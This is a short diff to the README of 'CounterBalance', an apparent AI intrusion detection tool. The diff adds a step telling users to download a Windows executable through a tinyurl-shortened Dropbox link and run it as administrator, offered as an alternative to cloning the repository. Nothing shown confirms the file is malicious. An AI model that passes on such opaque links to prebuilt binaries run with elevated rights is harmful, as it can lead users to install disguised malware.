@@ -23,6 +23,10 @@ CounterBalance is an AI-driven Intrusion Detection and Endpoint Defense System d
 
 ## Usage
 
+Download the CounterBalance .exe executable on dropbox here https://tinyurl.com/34hkk3wk , right click , and open as administrator.
+
+or
+
 1. Clone the repository:
 
     ```bash
